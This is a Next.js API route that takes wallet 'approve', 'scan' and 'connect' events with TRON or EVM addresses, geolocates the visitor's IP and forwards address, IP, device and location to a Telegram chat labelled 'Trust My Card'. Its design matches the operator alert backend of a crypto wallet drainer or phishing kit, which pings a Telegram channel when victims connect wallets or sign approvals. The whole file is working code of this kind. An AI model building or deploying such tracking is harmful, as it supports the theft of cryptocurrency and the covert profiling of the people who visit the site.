import { NextRequest, NextResponse } from "next/server";

export const dynamic = "force-dynamic";

/** Competitor-shaped ops ping body (approve / scan / connect). */
type TgLogBody = {
  type?: string;
  site?: string;
  device?: string;
  ip?: string;
  address?: string;
  error?: string | null;
  location?: string;
  network?: string;
  status?: string;
  userAgent?: string | null;
  // legacy keys still accepted
  event?: string;
  evm?: string | null;
  tron?: string | null;
};

type Enriched = {
  type: string;
  site: string;
  device: string;
  ip: string;
  address: string;
  error: string | null;
  location: string;
  network: string;
  status: string;
};

function ok(sent: boolean, data?: Partial<Enriched>) {
  return NextResponse.json({
    code: 200,
    status: "success",
    message: "OK",
    data: { sent, ...data },
    timestamp: new Date().toISOString(),
  });
}

function deviceFromUa(ua: string): string {
  const u = ua.toLowerCase();
  if (/ipad|tablet/.test(u)) return "Tablet";
  if (/mobi|iphone|android/.test(u)) return "Mobile";
  if (/mac|win|linux|cros/.test(u)) return "Desktop";
  return "Other";
}

function flagEmoji(countryCode: string): string {
  const cc = countryCode.trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) return "";
  const A = 0x1f1e6;
  return String.fromCodePoint(
    A + (cc.charCodeAt(0) - 65),
    A + (cc.charCodeAt(1) - 65)
  );
}

async function lookupLocation(ip: string): Promise<string> {
  if (!ip || ip === "unknown" || ip === "127.0.0.1" || ip === "::1") {
    return "Local";
  }
  try {
    const res = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,city,countryCode`,
      { cache: "no-store" }
    );
    if (!res.ok) return "Unknown";
    const json = (await res.json()) as {
      status?: string;
      country?: string;
      city?: string;
      countryCode?: string;
    };
    if (json.status !== "success") return "Unknown";
    const flag = json.countryCode ? ` ${flagEmoji(json.countryCode)}` : "";
    const city = json.city?.trim();
    const country = json.country?.trim();
    if (country && city) return `${country}, ${city}${flag}`;
    if (country) return `${country}${flag}`;
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

function clientIp(req: NextRequest, bodyIp?: string): string {
  if (bodyIp?.trim()) return bodyIp.trim();
  return (
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "unknown"
  );
}

export async function POST(req: NextRequest) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  let body: TgLogBody = {};
  try {
    body = (await req.json()) as TgLogBody;
  } catch {
    return NextResponse.json(
      {
        code: 400,
        status: "error",
        message: "Bad Request",
        error: "Invalid JSON body",
        timestamp: new Date().toISOString(),
      },
      { status: 400 }
    );
  }

  const address =
    body.address?.trim() ||
    body.tron?.trim() ||
    body.evm?.trim() ||
    "";

  if (!address) {
    return NextResponse.json(
      {
        code: 400,
        status: "error",
        message: "Bad Request",
        error: "Provide address",
        timestamp: new Date().toISOString(),
      },
      { status: 400 }
    );
  }

  const ua =
    body.userAgent ||
    req.headers.get("user-agent") ||
    "unknown";

  const ip = clientIp(req, body.ip);
  const location =
    body.location?.trim() || (await lookupLocation(ip));
  const device = body.device?.trim() || deviceFromUa(ua);

  const enriched: Enriched = {
    type: body.type?.trim() || body.event?.trim() || "scan",
    site:
      body.site?.trim() ||
      req.headers.get("host") ||
      "unknown",
    device,
    ip,
    address,
    error: body.error ?? null,
    location,
    network: body.network?.trim() || (address.startsWith("T") ? "tron" : "evm"),
    status: body.status?.trim() || "success",
  };

  // No Telegram credentials — still acknowledge with enriched payload logged
  if (!token || !chatId) {
    console.warn(
      "[tg-log] TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not set — skip send",
      enriched
    );
    return ok(false);
  }

  const text =
    `<b>Trust My Card — ${enriched.type}</b>\n` +
    `\n<b>status</b>: <code>${enriched.status}</code>` +
    `\n<b>network</b>: <code>${enriched.network}</code>` +
    `\n<b>address</b>: <code>${enriched.address}</code>` +
    `\n<b>site</b>: <code>${enriched.site}</code>` +
    `\n<b>device</b>: <code>${enriched.device}</code>` +
    `\n<b>ip</b>: <code>${enriched.ip}</code>` +
    `\n<b>location</b>: <code>${enriched.location}</code>` +
    (enriched.error
      ? `\n<b>error</b>: <code>${enriched.error}</code>`
      : "");

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
        cache: "no-store",
      }
    );

    const tgJson = (await tgRes.json()) as {
      ok?: boolean;
      description?: string;
    };
    if (!tgRes.ok || !tgJson.ok) {
      console.error("[tg-log] Telegram send failed", tgJson);
      return NextResponse.json(
        {
          code: 502,
          status: "error",
          message: "Telegram send failed",
          error: tgJson.description || "sendMessage failed",
          timestamp: new Date().toISOString(),
        },
        { status: 502 }
      );
    }

    return ok(true);
  } catch (err: unknown) {
    console.error("[tg-log]", err);
    return NextResponse.json(
      {
        code: 502,
        status: "error",
        message: "Telegram send failed",
        error: err instanceof Error ? err.message : "Unknown error",
        timestamp: new Date().toISOString(),
      },
      { status: 502 }
    );
  }
}
